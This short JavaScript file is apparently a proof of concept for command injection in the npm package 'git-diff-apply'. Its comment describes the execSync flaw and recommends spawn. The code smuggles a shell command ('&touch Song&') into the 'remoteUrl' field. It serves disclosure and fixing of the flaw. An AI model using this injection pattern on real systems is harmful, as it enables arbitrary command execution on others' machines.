/**
 * to do this attack, we need to make the package work first. 
 * To do this, we need to do 
 * "git init"
 * 'git add -A'
 * 'git commit -m "test"'
 * after these command, we set up the environment
 * Then we can run the code below
 *
 * Basically, in the "index.js" file, line 240, the run command
 * run the git command with a attacker controled variable "remoteUrl"
 *
 * Out suggestion is in the "run.js" file, use spawn instead of execSync
 * at the same time, in the index.js file, the run command is exported and can be
 * used directly, which is also potentially exploitable
 */
var root = require("git-diff-apply");
var attack_code = "&touch Song&";
root({"remoteUrl": "&touch Song&", "startTag": "none"})
